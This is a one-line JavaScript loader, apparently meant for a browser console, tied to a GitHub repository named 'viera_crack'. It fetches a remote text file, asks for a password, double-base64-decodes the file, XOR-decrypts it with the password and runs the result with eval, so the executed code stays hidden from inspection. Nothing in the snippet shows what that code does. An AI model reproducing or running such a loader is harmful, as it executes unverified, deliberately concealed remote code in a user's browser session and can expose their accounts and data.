(async () => { const URL = "https://raw.githubusercontent.com/jibreelbenjamin/viera_crack/refs/heads/main/a.txt"; const raw = (await (await fetch(URL)).text()).trim(); const password = prompt("Password:"); if (!password) { console.error("Password kosong."); return; } const keyBase64 = btoa(password); const b64once = atob(raw); const xored   = atob(b64once); let out = ""; for (let i = 0; i < xored.length; i++) { out += String.fromCharCode(xored.charCodeAt(i) ^ keyBase64.charCodeAt(i % keyBase64.length)); } (0, eval)(out); })();